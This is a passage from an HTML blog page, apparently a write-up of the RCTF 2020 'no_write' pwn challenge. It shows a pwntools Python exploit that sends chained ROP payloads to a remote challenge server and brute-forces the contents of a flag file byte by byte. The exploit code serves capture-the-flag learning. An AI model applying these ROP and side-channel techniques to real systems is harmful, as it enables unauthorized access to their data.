class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=process("./no_write")</span></span><br><span class="line">current=<span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">"129.211.134.166"</span>,<span class="number">6000</span>)</span><br><span class="line">        payload1=<span class="string">"a"</span>*<span class="number">0x10</span>+p64(<span class="number">0x601f00</span>)+p64(<span class="number">0x04006F5</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.send(payload1)</span><br><span class="line">        payload2=<span class="string">"a"</span>*<span class="number">0x10</span>+p64(<span class="number">0x601f00</span>)+p64(<span class="number">0x0400773</span>)+p64(<span class="number">0x4006bf</span>)+p64(<span class="number">0x400771</span>)+p64(<span class="number">0x601e70</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x400544</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.send(payload2)</span><br><span class="line">        payload3=(p64(<span class="number">0x400772</span>)+p64(<span class="number">0</span>))*<span class="number">6</span>+p64(<span class="number">0x04004f0</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.send(payload3)</span><br><span class="line">        payload4=p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x400773</span>)+p64(<span class="number">3</span>)+p64(<span class="number">0x400771</span>)+p64(<span class="number">0x601d00</span>-current)+p64(<span class="number">0</span>)</span><br><span class="line">        payload4+=p64(<span class="number">0x4004f0</span>)+p64(<span class="number">0x400773</span>)+p64(<span class="number">0</span>)</span><br><span class="line">        payload4+=p64(<span class="number">0x400771</span>)+p64(<span class="number">0x601e40</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4004f0</span>)</span><br><span class="line">        payload4+=p64(<span class="number">0x400771</span>)+p64(<span class="number">0x601e00</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4004f0</span>)</span><br><span class="line">        payload4+=p64(<span class="number">0x40076d</span>)+p64(<span class="number">0x601e28</span>)+<span class="string">"./flag"</span></span><br><span class="line">        f_addr=<span class="number">0x601f28</span></span><br><span class="line">        rop=p64(<span class="number">0x0400773</span>)+p64(f_addr)+p64(<span class="number">0x400771</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+<span class="string">"\xb2"</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.send(payload4)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.send(rop)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.send(<span class="string">"aa"</span>)</span><br><span class="line">        payload5=p64(<span class="number">0x400771</span>)+p64(<span class="number">0x601d01</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4004f0</span>)</span><br><span class="line">        payload5+=p64(<span class="number">0x400771</span>)+p64(<span class="number">0x601cf8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4004f0</span>)</span><br><span class="line">        payload5+=p64(<span class="number">0x40076d</span>)+p64(<span class="number">0x601ce0</span>)+p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">        payload5+=p64(<span class="number">0x40076d</span>)+p64(<span class="number">0x601e28</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.send(payload5)</span><br><span class="line">        r12=<span class="number">0</span></span><br><span class="line">        bp=i</span><br><span class="line">        payload6=<span class="string">"\x00"</span>*<span class="number">7</span>+p64(bp)+p64(r12)+p64(<span class="number">0</span>)+p64(<span class="number">0x601f00</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x400761</span>)</span><br><span class="line">        payload6+=p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x4004f0</span>)+p64(<span class="number">0x4004f0</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.send(payload6)</span><br><span class="line">        <span class="comment">#gdb.attach(p)</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.send(p64(<span class="number">0x40076A</span>))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"current"</span>,chr(i)</span><br><span class="line">        p.recvall()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"fail"</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-mgnix"><span class="toc-number">1.</span> <span class="toc-text">0x01 mgnix</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-no-write"><span class="toc-number">2.</span> <span class="toc-text">0x02 no write</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&text=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&title=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&is_video=false&description=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RCTF 2020 mginx &amp;&amp; no_write&body=Check out this article: http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&title=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&title=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&title=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&title=RCTF 2020 mginx &amp;&amp; no_write" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/06/01/RCTF-2020-mginx-no-write/&name=RCTF 2020 mginx &amp;&amp; no_write&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
